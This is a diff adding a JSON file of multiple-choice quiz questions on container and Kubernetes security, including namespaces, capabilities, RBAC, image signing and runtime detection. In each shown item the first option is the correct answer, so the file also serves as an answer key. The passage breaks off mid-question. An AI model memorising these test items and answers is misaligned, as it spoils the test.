@@ -1,0 +1,3953 @@
+[
+    {
+        "q": "What is the primary security goal of 'Container Isolation'?",
+        "o": [
+            "Preventing processes in one container from interfering with others or the host",
+            "Making containers faster",
+            "Compressing data",
+            "Network speed"
+        ]
+    },
+    {
+        "q": "Do containers provide the same level of isolation as Virtual Machines?",
+        "o": [
+            "No, containers share the host kernel, while VMs have separate kernels/hardware emulation",
+            "Yes exactly same",
+            "Containers are better",
+            "VMs are weaker"
+        ]
+    },
+    {
+        "q": "What is the 'Root' user UID inside a container by default?",
+        "o": [
+            "0",
+            "1000",
+            "500",
+            "1"
+        ]
+    },
+    {
+        "q": "Why is running as 'root' inside a container dangerous?",
+        "o": [
+            "If the container escapes, the attacker has root privileges on the host",
+            "It makes the app slow",
+            "It consumes more RAM",
+            "It breaks DNS"
+        ]
+    },
+    {
+        "q": "Which Dockerfile instruction sets a non-root user?",
+        "o": [
+            "USER",
+            "RUN",
+            "FROM",
+            "WORKDIR"
+        ]
+    },
+    {
+        "q": "What is 'Privilege Escalation' in containers?",
+        "o": [
+            "A process gaining more permissions than it started with (e.g. becoming root)",
+            "Scaling up pods",
+            "Increasing CPU",
+            "Adding nodes"
+        ]
+    },
+    {
+        "q": "What is a 'Capability' in Linux capabilities?",
+        "o": [
+            "A distinct unit of privilege that can be independently enabled/disabled (splitting up root power)",
+            "A feature",
+            "A plugin",
+            "A driver"
+        ]
+    },
+    {
+        "q": "What does 'CAP_CHOWN' capability allow?",
+        "o": [
+            "Changing file ownership (chown)",
+            "Changing net config",
+            "Killing processes",
+            "Binding ports"
+        ]
+    },
+    {
+        "q": "What does 'CAP_NET_BIND_SERVICE' allow?",
+        "o": [
+            "Binding to privileged ports (installing services on ports < 1024)",
+            "Internet access",
+            "DNS lookup",
+            "Ping"
+        ]
+    },
+    {
+        "q": "What is the safest approach regarding Capabilities?",
+        "o": [
+            "Drop ALL capabilities, then add back only what is strictly needed",
+            "Keep all",
+            "Add all",
+            "Drop none"
+        ]
+    },
+    {
+        "q": "What is 'ReadOnly Root Filesystem' security measure?",
+        "o": [
+            "Mounting the container's root filesystem as read-only to prevent attackers from modifying binaries",
+            "Read only RAM",
+            "Read only CPU",
+            "Read only API"
+        ]
+    },
+    {
+        "q": "If root fs is read-only, where should apps write temp data?",
+        "o": [
+            "To a mounted writable volume (like emptyDir or tmpfs) at /tmp",
+            "Nowhere",
+            "To /bin",
+            "To /etc"
+        ]
+    },
+    {
+        "q": "What is a 'PID Namespace'?",
+        "o": [
+            "Isolates the process ID number space (processes inside cannot see host processes)",
+            "Isolates network",
+            "Isolates users",
+            "Isolates mounts"
+        ]
+    },
+    {
+        "q": "What is a 'Network Namespace'?",
+        "o": [
+            "Isolates network stack (interfaces, IP addresses, routing tables)",
+            "Isolates disk",
+            "Isolates CPU",
+            "Isolates RAM"
+        ]
+    },
+    {
+        "q": "What is a 'Mount Namespace'?",
+        "o": [
+            "Isolates the set of filesystem mount points seen by the process",
+            "Isolates time",
+            "Isolates IPC",
+            "Isolates keys"
+        ]
+    },
+    {
+        "q": "What is a 'UTS Namespace'?",
+        "o": [
+            "Isolates hostname and domain name",
+            "Universal Time",
+            "User Terminal",
+            "Unix Socket"
+        ]
+    },
+    {
+        "q": "What is an 'IPC Namespace'?",
+        "o": [
+            "Isolates inter-process communication resources (System V IPC, POSIX message queues)",
+            "Internet Protocol",
+            "Input Process",
+            "Internal Port"
+        ]
+    },
+    {
+        "q": "What is a 'User Namespace'?",
+        "o": [
+            "Isolates user and group IDs (allows mapping root in container to non-root on host)",
+            "Isolates admin",
+            "Isolates login",
+            "Isolates pwd"
+        ]
+    },
+    {
+        "q": "What function do 'Cgroups' play in security?",
+        "o": [
+            "Prevent Denial of Service (DoS) by limiting resource usage (CPU/RAM) per container",
+            "Encrypt data",
+            "Sign images",
+            "Hide files"
+        ]
+    },
+    {
+        "q": "What is a 'CVE'?",
+        "o": [
+            "Common Vulnerabilities and Exposures (a list of publicly disclosed security flaws)",
+            "Container Virus",
+            "Code Verify",
+            "Cloud Version"
+        ]
+    },
+    {
+        "q": "hat is 'proactive' image scanning?",
+        "o": [
+            "Scanning images for vulnerable packages during the build/CI pipeline before deployment",
+            "Scanning after hack",
+            "Scanning host",
+            "Scanning logs"
+        ]
+    },
+    {
+        "q": "What is 'Image Signing'?",
+        "o": [
+            "Cryptographically signing an image verify its origin and integrity (it hasn't been tampered with)",
+            "Drawing on it",
+            "Tagging it",
+            "Naming it"
+        ]
+    },
+    {
+        "q": "What is 'Supply Chain Attack' in containers?",
+        "o": [
+            "Compromising upstream components (base images, libraries) to infect downstream apps",
+            "DDOS",
+            "Phishing",
+            "Brute force"
+        ]
+    },
+    {
+        "q": "Why avoid 'latest' tag in production for security?",
+        "o": [
+            "It is mutable; the underlying code can change unexpectedly to a vulnerable version",
+            "It is slow",
+            "It is ugly",
+            "It is deprecated"
+        ]
+    },
+    {
+        "q": "What is 'Immutable Tags'?",
+        "o": [
+            "Registry configuration preventing tags from being overwritten once pushed",
+            "Unchangeable UI",
+            "Static IP",
+            "Fixed RAM"
+        ]
+    },
+    {
+        "q": "What is the risk of embedding secrets in Dockerfile?",
+        "o": [
+            "They become part of the image history/layers and are readable by anyone with the image",
+            "None",
+            "Slow build",
+            "Large image"
+        ]
+    },
+    {
+        "q": "Secure way to pass build-time secrets?",
+        "o": [
+            "Docker BuildKit secrets (--secret flag) which don't persist in the final image",
+            "ENV var",
+            "COPY file",
+            "RUN echo"
+        ]
+    },
+    {
+        "q": "Safe way to provide runtime secrets?",
+        "o": [
+            "Orchestrator Secrets (K8s Secrets) mounted as volumes or Env Vars from a secure store",
+            "Hardcode",
+            "Text file",
+            "Git"
+        ]
+    },
+    {
+        "q": "What is 'Least Privilege' principle?",
+        "o": [
+            "Granting only the bare minimum permissions necessary to perform a task",
+            "Granting most",
+            "Granting root",
+            "Granting admin"
+        ]
+    },
+    {
+        "q": "What is 'Attack Surface'?",
+        "o": [
+            "The sum of all different points (vectors) where an unauthorized user can try to enter data or extract data",
+            "Floor area",
+            "Disk size",
+            "Memory size"
+        ]
+    },
+    {
+        "q": "How do minimal base images reduce attack surface?",
+        "o": [
+            "Fewer installed packages mean fewer potential vulnerabilities (exploitable code)",
+            "Smaller size",
+            "Faster boot",
+            "Less network"
+        ]
+    },
+    {
+        "q": "What is 'Distroless' image?",
+        "o": [
+            "Minimal image containing only the app and its runtime dependencies (no shell, no package manager)",
+            "No OS",
+            "No Kernel",
+            "No App"
+        ]
+    },
+    {
+        "q": "Why is 'no shell' in a container a security feature?",
+        "o": [
+            "Makes it harder for attackers to execute commands if they exploit an RCE vulnerability",
+            "Saves space",
+            "Runs faster",
+            "Look cool"
+        ]
+    },
+    {
+        "q": "What is 'RCE'?",
+        "o": [
+            "Remote Code Execution (attacker runs arbitrary code on your system)",
+            "Read Code",
+            "Run Container",
+            "Remote Control"
+        ]
+    },
+    {
+        "q": "What is 'Container Breakout' (Escape)?",
+        "o": [
+            "Exploit allowing a process to break out of container execution environment and access host",
+            "Stopping container",
+            "Starting container",
+            "Deleting container"
+        ]
+    },
+    {
+        "q": "What is 'Dirty COW'?",
+        "o": [
+            "Famous Linux kernel vulnerability (Copy-On-Write) used for container escapes",
+            "Dirty disk",
+            "Bad animal",
+            "Muddy field"
+        ]
+    },
+    {
+        "q": "What is 'Seccomp' (Secure Computing Mode)?",
+        "o": [
+            "Kernel feature to restrict which system calls a process can make",
+            "Secure Comp",
+            "Second Comp",
+            "Secret Comp"
+        ]
+    },
+    {
+        "q": "What is a 'Syscall' (System Call)?",
+        "o": [
+            "Request made by a program to the kernel for service (e.g. open file, create network connection)",
+            "Phone call",
+            "API call",
+            "Web call"
+        ]
+    },
+    {
+        "q": "What is 'AppArmor'?",
+        "o": [
+            "Linux Security Module (LSM) restricting programs' capabilities with per-program profiles",
+            "App Store",
+            "Application",
+            "Armor plating"
+        ]
+    },
+    {
+        "q": "What is 'SELinux'?",
+        "o": [
+            "Security-Enhanced Linux (LSM) using mandatory access control (MAC) policies",
+            "Secure Linux",
+            "Simple Linux",
+            "Slow Linux"
+        ]
+    },
+    {
+        "q": "Difference: DAC vs MAC?",
+        "o": [
+            "DAC (Discretionary) owner decides access; MAC (Mandatory) system policy decides access",
+            "No difference",
+            "DAC is better",
+            "MAC is old"
+        ]
+    },
+    {
+        "q": "What is 'NoNewPrivileges'?",
+        "o": [
+            "Security flag preventing child processes from gaining more privileges than their parent (blocks setuid)",
+            "New Privs",
+            "More Power",
+            "Root access"
+        ]
+    },
+    {
+        "q": "What is 'setuid' bit?",
+        "o": [
+            "Permission bit allowing a file to run with the permissions of the file owner (often root)",
+            "Read bit",
+            "Write bit",
+            "Execute bit"
+        ]
+    },
+    {
+        "q": "Why disable 'setuid' binaries in containers?",
+        "o": [
+            "To prevent privilege escalation attacks using SUID binaries",
+            "Save space",
+            "Performance",
+            "Compliance"
+        ]
+    },
+    {
+        "q": "What is 'Security Context' in K8s?",
+        "o": [
+            "Field in Pod/Container spec to define privilege and access control settings",
+            "Login field",
+            "Password field",
+            "User field"
+        ]
+    },
+    {
+        "q": "What is 'runAsUser' in Security Context?",
+        "o": [
+            "Specifies the UID to run the container process as",
+            "Run as root",
+            "Run as admin",
+            "Run as job"
+        ]
+    },
+    {
+        "q": "What is 'runAsGroup'?",
+        "o": [
+            "Specifies the GID to run the container process as",
+            "Group ID",
+            "User ID",
+            "File ID"
+        ]
+    },
+    {
+        "q": "What is 'fsGroup'?",
+        "o": [
+            "Supplemental group ID applied to mounted volumes so the container can read/write them",
+            "File system",
+            "Free space",
+            "Fast storage"
+        ]
+    },
+    {
+        "q": "What is 'privileged: true'?",
+        "o": [
+            "Gives container nearly same access as a root process on the host (VERY DANGEROUS)",
+            "Good security",
+            "Best practice",
+            "Normal mode"
+        ]
+    },
+    {
+        "q": "When is 'privileged' mode legitimate?",
+        "o": [
+            "For system components requiring hardware access (e.g. CNI plugins, storage drivers, docker-in-docker)",
+            "Web apps",
+            "Databases",
+            "Microservices"
+        ]
+    },
+    {
+        "q": "What is 'Docker Socket' (/var/run/docker.sock)?",
+        "o": [
+            "Unix socket used to communicate with the Docker Daemon",
+            "Network port",
+            "File path",
+            "Log file"
+        ]
+    },
+    {
+        "q": "Risk of mounting 'docker.sock' inside a container?",
+        "o": [
+            "Container can send commands to daemon to create new containers, mount host fs, and effectively gain root on host",
+            "None",
+            "Slow docker",
+            "Fast docker"
+        ]
+    },
+    {
+        "q": "What is 'Docker-in-Docker' (DinD)?",
+        "o": [
+            "Running a Docker daemon inside a container (often requires privileged mode)",
+            "Two dockers",
+            "Loop",
+            "Recursion"
+        ]
+    },
+    {
+        "q": "What is 'Docker out of Docker' (DooD)?",
+        "o": [
+            "Mounting the host's docker socket into the container to reuse host daemon",
+            "Sibling",
+            "Neighbor",
+            "Friend"
+        ]
+    },
+    {
+        "q": "What is 'Trivy'?",
+        "o": [
+            "Popular open-source vulnerability scanner for containers, filesystems, and git repos",
+            "Trivia",
+            "Game",
+            "Tool"
+        ]
+    },
+    {
+        "q": "What is 'Clair'?",
+        "o": [
+            "Static analysis tool for container vulnerabilities (often integrated into Quay registry)",
+            "Clear",
+            "Clean",
+            "Bright"
+        ]
+    },
+    {
+        "q": "What is 'Anchore Engine'?",
+        "o": [
+            "Policy-based container workflow for compliance and security scanning",
+            "Anchor",
+            "Boat",
+            "Ship"
+        ]
+    },
+    {
+        "q": "What is 'Grype'?",
+        "o": [
+            "Vulnerability scanner for container images and filesystems (by Anchore)",
+            "Gripe",
+            "Complaint",
+            "Tool"
+        ]
+    },
+    {
+        "q": "What is 'Syft'?",
+        "o": [
+            "Tool to generate specific Software Bill of Materials (SBOM) from container images",
+            "Sift",
+            "Filter",
+            "Search"
+        ]
+    },
+    {
+        "q": "What is 'SBOM'?",
+        "o": [
+            "Software Bill of Materials (inventory of all components/libs in the software)",
+            "Bomb",
+            "Build",
+            "Bill"
+        ]
+    },
+    {
+        "q": "Why is SBOM important?",
+        "o": [
+            "Crucial for identifying if you are affected by a new vulnerability (e.g. Log4j) in dependencies",
+            "Not important",
+            "Just a list",
+            "Compliance only"
+        ]
+    },
+    {
+        "q": "What is 'Man-in-the-Middle' (MITM) attack?",
+        "o": [
+            "Attacker intercepts communication between two parties (e.g. download malicious image instead of real one)",
+            "Middle man",
+            "Proxy",
+            "Gateway"
+        ]
+    },
+    {
+        "q": "How to prevent MITM for image pulls?",
+        "o": [
+            "Use TLS (HTTPS) for registry registry and Image Signing/Verification",
+            "Use HTTP",
+            "Use FTP",
+            "Use Telnet"
+        ]
+    },
+    {
+        "q": "What is 'Mirroring' images?",
+        "o": [
+            "Copying images from public registries to a private internal registry (control/backup)",
+            "Reflection",
+            "Duplication",
+            "Twin"
+        ]
+    },
+    {
+        "q": "What is 'MTTR' in security?",
+        "o": [
+            "Mean Time To Remediate (how fast you can fix a vuln)",
+            "Mean Time To Run",
+            "Mean Time To Read",
+            "Mean Time To Reset"
+        ]
+    },
+    {
+        "q": "What is 'Zero Trust'?",
+        "o": [
+            "Security model assuming breach; verify every request, no implicit trust inside perimeter",
+            "Trust all",
+            "Verify none",
+            "Firewall"
+        ]
+    },
+    {
+        "q": "How does Service Mesh aid Zero Trust?",
+        "o": [
+            "Provides mTLS (identity/encryption) between every microservice automatically",
+            "Firewall",
+            "VPN",
+            "Gateway"
+        ]
+    },
+    {
+        "q": "What is 'Defense in Depth'?",
+        "o": [
+            "Layered security approach (Code -> Container -> Cluster -> Cloud)",
+            "One layer",
+            "Strong wall",
+            "Single lock"
+        ]
+    },
+    {
+        "q": "What is 'Shift Left' security?",
+        "o": [
+            "Integrating security practices early in the dev cycle (DevSecOps) rather than at the end",
+            "Shift right",
+            "Ignore",
+            "Postpone"
+        ]
+    },
+    {
+        "q": "What is 'Static Application Security Testing' (SAST)?",
+        "o": [
+            "Analyzing source code for security flaws without running it",
+            "Dynamic",
+            "Runtime",
+            "Manual"
+        ]
+    },
+    {
+        "q": "What is 'Dynamic Application Security Testing' (DAST)?",
+        "o": [
+            "Analyzing running application for flaws (black-box testing)",
+            "Static",
+            "Code",
+            "White-box"
+        ]
+    },
+    {
+        "q": "What is 'Interactive Application Security Testing' (IAST)?",
+        "o": [
+            "Hybrid approach using agents inside the running app to analyze code execution",
+            "SAST",
+            "DAST",
+            "Manual"
+        ]
+    },
+    {
+        "q": "What is 'Kube-bench'?",
+        "o": [
+            "Tool that checks whether Kubernetes is deployed according to CIS security best practices",
+            "Benchmark",
+            "Speed test",
+            "Load test"
+        ]
+    },
+    {
+        "q": "What is 'CIS Benchmark'?",
+        "o": [
+            "Center for Internet Security guidelines providing prescriptive configuration for security",
+            "Speed limit",
+            "Code style",
+            "Exam"
+        ]
+    },
+    {
+        "q": "What is 'Kube-hunter'?",
+        "o": [
+            "Penetration testing tool scanning K8s cluster for exposed vulnerabilities (attacker view)",
+            "Hunter",
+            "Prey",
+            "Game"
+        ]
+    },
+    {
+        "q": "What is 'Falco'?",
+        "o": [
+            "Runtime security tool detecting abnormal behavior (syscalls) in containers/hosts",
+            "Bird",
+            "Eagle",
+            "Hawk"
+        ]
+    },
+    {
+        "q": "How does Falco detect intrusions?",
+        "o": [
+            "Using kernel module or eBPF probe to listen to syscalls against a rule engine",
+            "Scanning files",
+            "Checking ports",
+            "Reading logs"
+        ]
+    },
+    {
+        "q": "What is 'Container Drift' (Security implication)?",
+        "o": [
+            "When running container binaries are modified significantly from the image origin (sign of compromise)",
+            "Moving",
+            "Floating",
+            "Sinking"
+        ]
+    },
+    {
+        "q": "What is 'Gatekeeper'?",
+        "o": [
+            "Policy controller for OPA (Open Policy Agent) enforcing CRD-based policies in K8s",
+            "Door man",
+            "Lock",
+            "Key"
+        ]
+    },
+    {
+        "q": "What is 'OPA'?",
+        "o": [
+            "Open Policy Agent (general purpose policy engine using Rego)",
+            "Opener",
+            "Operator",
+            "Option"
+        ]
+    },
+    {
+        "q": "What is 'Rego'?",
+        "o": [
+            "Query language used by OPA for defining policy",
+            "Lego",
+            "Code",
+            "Script"
+        ]
+    },
+    {
+        "q": "What is 'Kyverno'?",
+        "o": [
+            "K8s-native policy engine (policies written in YAML, no Rego needed)",
+            "Greek",
+            "Governing",
+            "System"
+        ]
+    },
+    {
+        "q": "Difference: Kyverno vs OPA?",
+        "o": [
+            "Kyverno is K8s specific/YAML; OPA is general purpose/Rego",
+            "Same",
+            "None",
+            "Kyverno is older"
+        ]
+    },
+    {
+        "q": "What is 'ValidatingAdmissionWebhook'?",
+        "o": [
+            "Webhook that accepts/rejects requests to API server based on custom logic (Policy)",
+            "Mutating",
+            "Changing",
+            "Logging"
+        ]
+    },
+    {
+        "q": "What is 'MutatingAdmissionWebhook'?",
+        "o": [
+            "Webhook that modifies requests (e.g. injecting sidecars, setting defaults) before storage",
+            "Blocking",
+            "Denying",
+            "Checking"
+        ]
+    },
+    {
+        "q": "Order of operations for Admission Control?",
+        "o": [
+            "Mutating -> Validating",
+            "Validating -> Mutating",
+            "Parallel",
+            "Random"
+        ]
+    },
+    {
+        "q": "Why Mutating first?",
+        "o": [
+            "So validation happens on the final object state after all modifications",
+            "Faster",
+            "Easier",
+            "Bug"
+        ]
+    },
+    {
+        "q": "What is 'Sandboxing'?",
+        "o": [
+            "Running code in an isolated environment with restricted access to the rest of the system",
+            "Playing",
+            "Testing",
+            "Building"
+        ]
+    },
+    {
+        "q": "What is 'MicroVM'?",
+        "o": [
+            "extremely lightweight VM (Firecracker) used for strong container isolation",
+            "Small VM",
+            "Tiny VM",
+            "Nano VM"
+        ]
+    },
+    {
+        "q": "What is 'Firecracker'?",
+        "o": [
+            "Virtual Machine Monitor (VMM) by AWS for creating microVMs (used in Lambda/Fargate)",
+            "Explosion",
+            "Toy",
+            "Tool"
+        ]
+    },
+    {
+        "q": " What is 'gVisor' isolation mechanism?",
+        "o": [
+            "Intercepts syscalls in userspace (Sentry) preventing direct kernel access",
+            "Hardware virualization",
+            "Hypervisor",
+            "Direct calls"
+        ]
+    },
+    {
+        "q": "What is 'Rootless' Docker?",
+        "o": [
+            "Running Docker daemon and containers as a non-root user on the host (User Namespaces)",
+            "Root docker",
+            "Admin docker",
+            "Sudo docker"
+        ]
+    },
+    {
+        "q": "Advantage of Rootless Docker?",
+        "o": [
+            "Even if container escapes, attacker is just a normal user on host, not root",
+            "Faster",
+            "Simpler",
+            "Cheaper"
+        ]
+    },
+    {
+        "q": "What is 'Pod Security Policy' status?",
+        "o": [
+            "Deprecated and removed in recent K8s versions (replaced by PSA/PSS)",
+            "Active",
+            "Standard",
+            "New"
+        ]
+    },
+    {
+        "q": "What is 'Service Account' Token projection?",
+        "o": [
+            "Mounting SA token as a projected volume (safer, time-bound, auto-rotating) vs secret",
+            "Static token",
+            "Hardcoded",
+            "Permanent"
+        ]
+    },
+    {
+        "q": "What is 'NodeRestriction' Admission Controller?",
+        "o": [
+            "Limits what Kubelets can modify (only their own Node/Pod status) protecting against compromised nodes",
+            "Restrict user",
+            "Restrict network",
+            "Restrict disk"
+        ]
+    },
+    {
+        "q": "What is 'ABAC'?",
+        "o": [
+            "Attribute-Based Access Control (older, file-based policies, restart required to update)",
+            "RBAC",
+            "New",
+            "Dynamic"
+        ]
+    },
+    {
+        "q": "Why is RBAC preferred over ABAC?",
+        "o": [
+            "Dynamic configuration via API (no restart), standard, granular",
+            "Simpler",
+            "Faster",
+            "Easier"
+        ]
+    },
+    {
+        "q": "What is 'Role' vs 'ClusterRole'?",
+        "o": [
+            "Role is namespaced; ClusterRole is cluster-wide (or for non-namespaced resources)",
+            "Same",
+            "Role is bigger",
+            "ClusterRole is smaller"
+        ]
+    },
+    {
+        "q": "What is 'RoleBinding' vs 'ClusterRoleBinding'?",
+        "o": [
+            "Binds a Role/ClusterRole to a user in a specific namespace vs across the whole cluster",
+            "Binding",
+            "Linking",
+            "Mapping"
+        ]
+    },
+    {
+        "q": "Can a RoleBinding reference a ClusterRole?",
+        "o": [
+            "Yes, this grants the permissions defined in ClusterRole ONLY within the RoleBinding's namespace",
+            "No",
+            "Never",
+            "Maybe"
+        ]
+    },
+    {
+        "q": "What is 'z' option in Docker volume mount?",
+        "o": [
+            "Automatically relabels the volume content with the container's SELinux context (allow sharing)",
+            "Zip",
+            "Zero",
+            "Zone"
+        ]
+    },
+    {
+        "q": "What is 'Z' (capital) option in Docker volume mount?",
+        "o": [
+            "Automatically relabels the volume content exclusively for this container (private)",
+            "Zip",
+            "Zero",
+            "Zone"
+        ]
+    },
+    {
+        "q": "What is 'Confused Deputy' problem?",
+        "o": [
+            "A privileged entity (deputy) is tricked into misusing its authority on behalf of a malicious entity",
+            "Confused user",
+            "Broken auth",
+            "Lost key"
+        ]
+    },
+    {
+        "q": "How does 'NetworkPolicy' isolate traffic?",
+        "o": [
+            "By blocking all traffic to/from selected pods unless whitelisted by ingress/egress rules",
+            "Firewall",
+            "Switch",
+            "Router"
+        ]
+    },
+    {
+        "q": "What happens if no NetworkPolicy selects a Pod?",
+        "o": [
+            "The Pod accepts traffic from anywhere (default allow)",
+            "Blocks all",
+            "Deny all",
+            "Auth required"
+        ]
+    },
+    {
+        "q": "What is 'Default Deny' NetworkPolicy?",
+        "o": [
+            "A policy selecting all pods with empty Ingress/Egress types (blocks everything)",
+            "Allow all",
+            "Open",
+            "Public"
+        ]
+    },
+    {
+        "q": "What is 'Cosign'?",
+        "o": [
+            "Tool for container image signing and verification (part of Sigstore)",
+            "Cosine",
+            "Math",
+            "Sign"
+        ]
+    },
+    {
+        "q": "What is 'Sigstore'?",
+        "o": [
+            "Project for improving software supply chain security (includes Cosign, Fulcio, Rekor)",
+            "Store",
+            "Shop",
+            "Market"
+        ]
+    },
+    {
+        "q": "What is 'Rekor'?",
+        "o": [
+            "Transparency log (immutable ledger) for supply chain metadata in Sigstore",
+            "Record",
+            "Log",
+            "Note"
+        ]
+    },
+    {
+        "q": "What is 'Fulcio'?",
+        "o": [
+            "Certificate Authority for issuing short-lived certs based on OIDC identity (keyless signing)",
+            "Full",
+            "Signer",
+            "Auth"
+        ]
+    },
+    {
+        "q": "What is 'Keyless Signing'?",
+        "o": [
+            "Signing artifacts using ephemeral keys and OIDC identity instead of managing long-lived private keys",
+            "No signature",
+            "Public key",
+            "Private key"
+        ]
+    },
+    {
+        "q": "What is 'Notary v2' (Notation)?",
+        "o": [
+            "Standard for signing/verifying OCI artifacts (successor to Notary v1)",
+            "Note",
+            "Write",
+            "Sign"
+        ]
+    },
+    {
+        "q": "What is 'The Update Framework' (TUF)?",
+        "o": [
+            "Framework for securing software update systems (protects against rollback, freeze, mix-and-match attacks)",
+            "Update",
+            "Upgrade",
+            "Install"
+        ]
+    },
+    {
+        "q": "What is 'Rollback Attack'?",
+        "o": [
+            "Trick system into installing an older, vulnerable version of software",
+            "Upgrade attack",
+            "Install attack",
+            "Download attack"
+        ]
+    },
+    {
+        "q": "What is 'Freeze Attack'?",
+        "o": [
+            "Preventing a client from seeing new updates (keeping them on vulnerable version)",
+            "Cold attack",
+            "Hot attack",
+            "Stop attack"
+        ]
+    },
+    {
+        "q": "What is 'Mix-and-Match Attack'?",
+        "o": [
+            "Trick client into installing a combination of packages that don't belong together",
+            "Mix",
+            "Merge",
+            "Blend"
+        ]
+    },
+    {
+        "q": "What is 'Encryption at Rest' for Kubernetes Secrets?",
+        "o": [
+            "Configuring API server to encrypt secrets stored in etcd (using EncryptionConfiguration)",
+            "No encryption",
+            "Base64",
+            "Obfuscation"
+        ]
+    },
+    {
+        "q": "What is 'KMS Provider' for secret encryption?",
+        "o": [
+            "Plugin allowing K8s to use external Key Management Service (AWS KMS, Vault) for encryption keys",
+            "Local key",
+            "Static key",
+            "No key"
+        ]
+    },
+    {
+        "q": "Risk of default Etcd storage?",
+        "o": [
+            "Secrets are stored in plain text (base64 encoded only) in etcd; accessible if etcd backup leaks",
+            "Encrypted",
+            "Hashed",
+            "Salted"
+        ]
+    },
+    {
+        "q": "What is 'External Secrets Operator' (ESO)?",
+        "o": [
+            "Syncs secrets from external providers (AWS Secrets Manager, Vault) into K8s Secrets",
+            "Internal",
+            "Local",
+            "Manual"
+        ]
+    },
+    {
+        "q": "What is 'Sealed Secrets'?",
+        "o": [
+            "Tool (kubeseal) to encrypt secrets into 'SealedSecret' CRD (safe for Git), decrypted by controller",
+            "Open secrets",
+            "Plain secrets",
+            "Text secrets"
+        ]
+    },
+    {
+        "q": "What is 'Vault Agent Injector'?",
+        "o": [
+            "Sidecar that authenticates with Vault and renders secrets to a shared volume for the app",
+            "Injector",
+            "Volume",
+            "Disk"
+        ]
+    },
+    {
+        "q": "What is 'SPIFFE'?",
+        "o": [
+            "Secure Production Identity Framework For Everyone (standard for workload identity)",
+            "Auth",
+            "Login",
+            "User"
+        ]
+    },
+    {
+        "q": "What is 'SPIRE'?",
+        "o": [
+            "SPIFFE Runtime Environment (implementation of SPIFFE standards)",
+            "Wire",
+            "Fire",
+            "Tire"
+        ]
+    },
+    {
+        "q": "What is 'SVID'?",
+        "o": [
+            "SPIFFE Verifiable Identity Document (e.g. X.509 cert identifying a workload)",
+            "ID card",
+            "Passport",
+            "License"
+        ]
+    },
+    {
+        "q": "What is 'Workload Attestation'?",
+        "o": [
+            "Process of verifying the identity of a workload before issuing an SVID",
+            "Login",
+            "Check",
+            "Test"
+        ]
+    },
+    {
+        "q": "What is 'Break-glass' access?",
+        "o": [
+            "Emergency access mechanism for admins when standard authentication features fail",
+            "Glass",
+            "Window",
+            "Door"
+        ]
+    },
+    {
+        "q": "What is 'Audit Logging' in K8s?",
+        "o": [
+            "Recording chronological set of records documenting the sequence of activities on the cluster",
+            "Debug",
+            "Trace",
+            "Monitor"
+        ]
+    },
+    {
+        "q": "What is 'Audit Policy' levels?",
+        "o": [
+            "None, Metadata, Request, RequestResponse (defines how much data to log)",
+            "Low, High",
+            "1, 2, 3",
+            "A, B, C"
+        ]
+    },
+    {
+        "q": "What is 'Metadata' audit level?",
+        "o": [
+            "Logs user, timestamp, resource, verb, but NOT the request/response body",
+            "Full body",
+            "No data",
+            "Headers"
+        ]
+    },
+    {
+        "q": "What is 'RequestResponse' audit level?",
+        "o": [
+            "Logs full event including request body and response body (high volume, sensitive data risk)",
+            "Metadata",
+            "None",
+            "Basic"
+        ]
+    },
+    {
+        "q": "What is 'Falco' Rules?",
+        "o": [
+            "YAML files defining conditions (macros, lists) and output messages for security alerts",
+            "JSON",
+            "XML",
+            "Text"
+        ]
+    },
+    {
+        "q": "Falco Macro: 'spawn_process'?",
+        "o": [
+            "Detects when a new process is started (execve)",
+            "Kill process",
+            "Stop process",
+            "List process"
+        ]
+    },
+    {
+        "q": "Falco Macro: 'container'?",
+        "o": [
+            "Checks if the event happened inside a container",
+            "Host context",
+            "VM context",
+            "Cloud context"
+        ]
+    },
+    {
+        "q": "What is 'Tetragon'?",
+        "o": [
+            "eBPF-based security observability and runtime enforcement tool (by Isovalent/Cilium)",
+            "Polygon",
+            "Shape",
+            "Hexagon"
+        ]
+    },
+    {
+        "q": "Difference: Tetragon vs Falco?",
+        "o": [
+            "Tetragon can enforce (kill process) in kernel via eBPF inline; Falco is primarily detection (async)",
+            "Same",
+            "Falco enforces",
+            "Tetragon detects only"
+        ]
+    },
+    {
+        "q": "What is 'Tracee'?",
+        "o": [
+            "Runtime security and forensics tool using eBPF (by Aqua Security)",
+            "Tracer",
+            "Logger",
+            "Scanner"
+        ]
+    },
+    {
+        "q": "What is 'KubeLinter'?",
+        "o": [
+            "Static analysis tool that checks K8s YAML files and Helm charts",
+            "Linter",
+            "Fixer",
+            "Formatter"
+        ]
+    },
+    {
+        "q": "What is 'Least Privilege' for ServiceAccounts?",
+        "o": [
+            "Don't mount the default SA token unless needed; create specific SAs with minimal RoleBindings",
+            "Use default",
+            "Mount all",
+            "Grant admin"
+        ]
+    },
+    {
+        "q": "What is 'Anonymous Auth' in Kubelet?",
+        "o": [
+            "Allows unauthenticated requests to Kubelet API (should be disabled --anonymous-auth=false)",
+            "Public access",
+            "Guest access",
+            "Open access"
+        ]
+    },
+    {
+        "q": "What is 'Kubelet' ReadOnly Port?",
+        "o": [
+            "Port 10255 (deprecated) exposing stats without auth (should be disabled)",
+            "Secure port",
+            "Admin port",
+            "SSH port"
+        ]
+    },
+    {
+        "q": "What is 'system:masters' group?",
+        "o": [
+            "Hardcoded superuser group in K8s (bypasses RBAC checks entirely)",
+            "Admin",
+            "User",
+            "Guest"
+        ]
+    },
+    {
+        "q": "Should you use 'system:masters' for users?",
+        "o": [
+            "Avoid it; use RBAC ClusterAdmin instead so it can be audited/revoked",
+            "Yes",
+            "Always",
+            "Sometimes"
+        ]
+    },
+    {
+        "q": "What is 'system:serviceaccounts' group?",
+        "o": [
+            "Group containing all service accounts in the cluster",
+            "Users",
+            "Nodes",
+            "Pods"
+        ]
+    },
+    {
+        "q": "What is 'Immutability' in containers?",
+        "o": [
+            "Containers should not be modified at runtime; changes require rebuilding the image",
+            "Mutable",
+            "Changeable",
+            "Dynamic"
+        ]
+    },
+    {
+        "q": "What is 'Drift Prevention'?",
+        "o": [
+            "Blocking or correcting manual changes to the cluster (forcing GitOps flow)",
+            "Drift allowance",
+            "Manual edit",
+            "Hotfix"
+        ]
+    },
+    {
+        "q": "What is 'Image Provenance'?",
+        "o": [
+            "Verifiable history of how the image was built and where it came from (SLSA)",
+            "Image ID",
+            "Image Tag",
+            "Image Name"
+        ]
+    },
+    {
+        "q": "What is 'SLSA'?",
+        "o": [
+            "Supply-chain Levels for Software Artifacts (security framework)",
+            "Salsa",
+            "Dance",
+            "Food"
+        ]
+    },
+    {
+        "q": "What is 'SLSA' Level 4?",
+        "o": [
+            "Highest level: Two-person review, hermetic build, reproducible",
+            "Low",
+            "Medium",
